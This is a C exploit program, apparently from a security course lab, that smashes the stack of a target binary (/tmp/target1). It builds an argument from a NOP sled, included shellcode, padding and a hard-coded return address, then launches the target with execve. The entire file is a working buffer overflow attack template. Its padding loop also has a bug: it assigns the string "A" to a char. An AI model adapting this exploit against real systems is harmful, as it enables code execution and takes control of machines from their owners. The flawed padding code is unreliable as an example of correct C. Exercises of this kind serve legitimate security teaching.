#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define BUFFER 240
#define FP 4
#define RET 4
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = "hi there";
  args[2] = NULL;
  env[0] = NULL;

  char *buff_address= "\xec\xfc\xff\xbf";

  if (!(args[1] = (char *)malloc((BUFFER + RET + FP) * sizeof(char))))
  {
    exit(EXIT_FAILURE);
  }

  int i;
  for (i = 0; i < BUFFER - strlen(shellcode); ++i)
  {
    args[1][i] = NOP;
  }

  for (i = 0; i < strlen(shellcode); ++i)
  {
    args[1][i + BUFFER - strlen(shellcode)] = shellcode[i];
  }

  for (i = 0; i < RET; ++i) {
    args[1][i + BUFFER] = "A";
  }

  for (i = 0; i < RET; ++i) {
    args[1][i + BUFFER + FP] = buff_address[i];
  }

  // printf("%s\n", args[1]);
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}